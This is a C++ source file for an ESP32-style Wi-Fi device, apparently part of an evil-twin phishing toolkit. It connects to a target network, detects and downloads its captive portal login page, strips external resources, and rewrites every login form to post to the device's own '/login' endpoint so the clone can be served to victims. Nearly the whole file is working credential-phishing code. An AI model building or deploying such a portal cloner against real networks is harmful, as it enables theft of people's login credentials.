#include "portal_cloner.h"
#include "config.h"

PortalCloner::PortalCloner() {
    clonedPortal.isCloned = false;
    clonedPortal.htmlSize = 0;
}

bool PortalCloner::connectToNetwork(const char* ssid, const char* password) {
    Serial.printf("\n[*] Connecting to '%s'...\n", ssid);
    
    // Disconnect from any existing connection
    WiFi.disconnect();
    delay(100);
    
    // Set to station mode
    WiFi.mode(WIFI_AP_STA);
    
    // Connect
    if (strlen(password) > 0) {
        WiFi.begin(ssid, password);
    } else {
        WiFi.begin(ssid);
    }
    
    // Wait for connection (timeout 15 seconds)
    int attempts = 0;
    while (WiFi.status() != WL_CONNECTED && attempts < 30) {
        delay(500);
        Serial.print(".");
        attempts++;
    }
    
    if (WiFi.status() == WL_CONNECTED) {
        Serial.println();
        Serial.printf("[+] Connected to '%s'\n", ssid);
        Serial.printf("[+] IP Address: %s\n", WiFi.localIP().toString().c_str());
        clonedPortal.ssid = String(ssid);
        return true;
    } else {
        Serial.println();
        Serial.println("[-] Connection failed!");
        return false;
    }
}

bool PortalCloner::detectCaptivePortal() {
    Serial.println("\n[*] Detecting captive portal...");
    
    if (WiFi.status() != WL_CONNECTED) {
        Serial.println("[-] Not connected to any network!");
        return false;
    }
    
    // Try common captive portal detection URLs
    for (int i = 0; i < 10; i++) {
        Serial.printf("[*] Trying: %s\n", detectionURLs[i]);
        
        http.begin(detectionURLs[i]);
        http.setFollowRedirects(HTTPC_FORCE_FOLLOW_REDIRECTS);
        http.setTimeout(5000);
        
        int httpCode = http.GET();
        
        if (httpCode > 0) {
            // Check for redirect (captive portal detected)
            if (httpCode == HTTP_CODE_FOUND || 
                httpCode == HTTP_CODE_MOVED_PERMANENTLY || 
                httpCode == HTTP_CODE_TEMPORARY_REDIRECT) {
                
                String location = http.getLocation();
                Serial.printf("[+] Captive portal detected!\n");
                Serial.printf("[+] Portal URL: %s\n", location.c_str());
                
                clonedPortal.portalURL = location;
                http.end();
                return true;
            }
            
            // Check response content
            String payload = http.getString();
            
            // Look for captive portal indicators
            if (payload.indexOf("<form") != -1 && 
                (payload.indexOf("password") != -1 || 
                 payload.indexOf("login") != -1 ||
                 payload.indexOf("username") != -1)) {
                
                Serial.println("[+] Captive portal detected in response!");
                clonedPortal.portalURL = String(detectionURLs[i]);
                clonedPortal.html = payload;
                http.end();
                return true;
            }
        }
        
        http.end();
        delay(500);
    }
    
    Serial.println("[-] No captive portal detected");
    Serial.println("[*] This might be an open network without portal");
    return false;
}

bool PortalCloner::downloadPortal() {
    Serial.println("\n[*] Downloading captive portal...");
    
    if (clonedPortal.portalURL.length() == 0) {
        Serial.println("[-] No portal URL found! Run detectCaptivePortal first.");
        return false;
    }
    
    // Download the portal page
    String html = fetchURL(clonedPortal.portalURL);
    
    if (html.length() == 0) {
        Serial.println("[-] Failed to download portal!");
        return false;
    }
    
    Serial.printf("[+] Downloaded %d bytes\n", html.length());
    
    // Simplify HTML
    Serial.println("[*] Simplifying HTML...");
    String simplified = simplifyHTML(html);
    
    Serial.printf("[+] Simplified to %d bytes\n", simplified.length());
    
    // Make self-contained
    Serial.println("[*] Making portal self-contained...");
    String selfContained = makePortalSelfContained(simplified, clonedPortal.portalURL);
    
    // Store cloned portal
    clonedPortal.html = selfContained;
    clonedPortal.htmlSize = selfContained.length();
    clonedPortal.isCloned = true;
    
    Serial.println("[+] Portal cloned successfully!");
    Serial.printf("[+] Final size: %d bytes\n", clonedPortal.htmlSize);
    
    return true;
}

String PortalCloner::fetchURL(const String& url) {
    http.begin(url);
    http.setTimeout(10000);
    http.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
    http.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    
    int httpCode = http.GET();
    
    if (httpCode == HTTP_CODE_OK) {
        String payload = http.getString();
        http.end();
        return payload;
    } else {
        Serial.printf("[-] HTTP Error: %d\n", httpCode);
        http.end();
        return "";
    }
}

String PortalCloner::simplifyHTML(const String& html) {
    String simplified = html;
    
    // Remove comments
    int commentStart;
    while ((commentStart = simplified.indexOf("<!--")) != -1) {
        int commentEnd = simplified.indexOf("-->", commentStart);
        if (commentEnd != -1) {
            simplified.remove(commentStart, commentEnd - commentStart + 3);
        } else {
            break;
        }
    }
    
    // Remove external scripts (keep inline)
    simplified = stripExternalResources(simplified);
    
    // Remove tracking scripts
    String trackingKeywords[] = {"analytics", "gtag", "facebook", "fbq", "google-analytics", "_gaq"};
    for (String keyword : trackingKeywords) {
        int pos = 0;
        while ((pos = simplified.indexOf(keyword, pos)) != -1) {
            // Find enclosing script tag
            int scriptStart = simplified.lastIndexOf("<script", pos);
            int scriptEnd = simplified.indexOf("</script>", pos);
            if (scriptStart != -1 && scriptEnd != -1) {
                simplified.remove(scriptStart, scriptEnd - scriptStart + 9);
                pos = scriptStart;
            } else {
                pos++;
            }
        }
    }
    
    return simplified;
}

String PortalCloner::stripExternalResources(const String& html) {
    String result = html;
    
    // Remove external CSS links
    int linkPos = 0;
    while ((linkPos = result.indexOf("<link", linkPos)) != -1) {
        int linkEnd = result.indexOf(">", linkPos);
        if (linkEnd != -1) {
            String linkTag = result.substring(linkPos, linkEnd + 1);
            
            // Check if it's external (has http:// or https://)
            if (linkTag.indexOf("http://") != -1 || linkTag.indexOf("https://") != -1) {
                result.remove(linkPos, linkEnd - linkPos + 1);
            } else {
                linkPos = linkEnd + 1;
            }
        } else {
            break;
        }
    }
    
    // Remove external script sources
    int scriptPos = 0;
    while ((scriptPos = result.indexOf("<script", scriptPos)) != -1) {
        int scriptEnd = result.indexOf("</script>", scriptPos);
        if (scriptEnd != -1) {
            String scriptTag = result.substring(scriptPos, scriptEnd + 9);
            
            // Check if it has external src
            if (scriptTag.indexOf("src=") != -1 && 
                (scriptTag.indexOf("http://") != -1 || scriptTag.indexOf("https://") != -1)) {
                result.remove(scriptPos, scriptEnd - scriptPos + 9);
            } else {
                scriptPos = scriptEnd + 9;
            }
        } else {
            break;
        }
    }
    
    // Remove external images (replace with placeholder or remove)
    int imgPos = 0;
    while ((imgPos = result.indexOf("<img", imgPos)) != -1) {
        int imgEnd = result.indexOf(">", imgPos);
        if (imgEnd != -1) {
            String imgTag = result.substring(imgPos, imgEnd + 1);
            
            // Check if external
            if (imgTag.indexOf("http://") != -1 || imgTag.indexOf("https://") != -1) {
                // Remove the image
                result.remove(imgPos, imgEnd - imgPos + 1);
            } else {
                imgPos = imgEnd + 1;
            }
        } else {
            break;
        }
    }
    
    return result;
}

String PortalCloner::makePortalSelfContained(const String& html, const String& baseURL) {
    String result = html;
    
    // Change form action to our /login endpoint
    int formPos = 0;
    while ((formPos = result.indexOf("<form", formPos)) != -1) {
        int formEnd = result.indexOf(">", formPos);
        if (formEnd != -1) {
            String formTag = result.substring(formPos, formEnd + 1);
            
            // Replace action with /login
            int actionPos = formTag.indexOf("action=");
            if (actionPos != -1) {
                int quoteStart = formTag.indexOf("\"", actionPos);
                int quoteEnd = formTag.indexOf("\"", quoteStart + 1);
                
                if (quoteStart != -1 && quoteEnd != -1) {
                    // Replace the action URL
                    String newForm = formTag.substring(0, quoteStart + 1) + 
                                   "/login" + 
                                   formTag.substring(quoteEnd);
                    result = result.substring(0, formPos) + newForm + result.substring(formEnd + 1);
                }
            } else {
                // Add action if not present
                String newForm = formTag.substring(0, 5) + " action=\"/login\" method=\"POST\"" + formTag.substring(5);
                result = result.substring(0, formPos) + newForm + result.substring(formEnd + 1);
            }
            
            formPos = formEnd + 1;
        } else {
            break;
        }
    }
    
    // Ensure form method is POST
    formPos = 0;
    while ((formPos = result.indexOf("<form", formPos)) != -1) {
        int formEnd = result.indexOf(">", formPos);
        if (formEnd != -1) {
            String formTag = result.substring(formPos, formEnd + 1);
            
            if (formTag.indexOf("method=") == -1) {
                String newForm = formTag.substring(0, formTag.length() - 1) + " method=\"POST\">";
                result = result.substring(0, formPos) + newForm + result.substring(formEnd + 1);
            }
            
            formPos = formEnd + 1;
        } else {
            break;
        }
    }
    
    return result;
}

ClonedPortal PortalCloner::getClonedPortal() {
    return clonedPortal;
}

bool PortalCloner::hasClonedPortal() {
    return clonedPortal.isCloned;
}

void PortalCloner::clearClonedPortal() {
    clonedPortal.isCloned = false;
    clonedPortal.html = "";
    clonedPortal.portalURL = "";
    clonedPortal.ssid = "";
    clonedPortal.htmlSize = 0;
    Serial.println("[*] Cloned portal cleared");
}

String PortalCloner::getCloneInfo() {
    String info = "\n╔══════════════════════════════════════════════════════════════╗\n";
    info += "║                   CLONED PORTAL INFO                        ║\n";
    info += "╚══════════════════════════════════════════════════════════════╝\n\n";
    
    if (!clonedPortal.isCloned) {
        info += "[*] No portal has been cloned yet.\n";
        return info;
    }
    
    info += "╔══════════════════════════════════════════════════════════════╗\n";
    info += "║ Source Network:  " + clonedPortal.ssid + "\n";
    info += "║ Portal URL:      " + clonedPortal.portalURL + "\n";
    info += "║ HTML Size:       " + String(clonedPortal.htmlSize) + " bytes\n";
    info += "║ Status:          CLONED & READY\n";
    info += "╚══════════════════════════════════════════════════════════════╝\n\n";
    info += "[+] This portal can now be used in captive portal mode\n";
    info += "[*] Use option [2] to start serving the cloned portal\n";
    
    return info;
}

void PortalCloner::disconnect() {
    WiFi.disconnect();
    WiFi.mode(WIFI_AP);
    Serial.println("[*] Disconnected from target network");
}